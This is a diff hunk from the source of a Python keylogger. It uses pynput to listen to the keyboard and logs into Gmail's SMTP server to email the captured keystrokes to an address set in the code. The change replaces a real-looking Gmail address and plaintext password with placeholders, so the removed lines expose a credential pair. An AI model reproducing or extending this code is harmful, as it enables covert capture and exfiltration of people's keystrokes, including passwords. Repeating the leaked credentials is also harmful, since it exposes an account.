@@ -17,8 +17,8 @@ from pynput.keyboard import Key, Listener # for keylogs
 ########################################################################
 
 # email which receives the keystrokes 
-email = 'disboard.code1@gmail.com'
-password = 'codingftw'
+email = 'sample@gmail.com'
+password = 'sample'
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
 
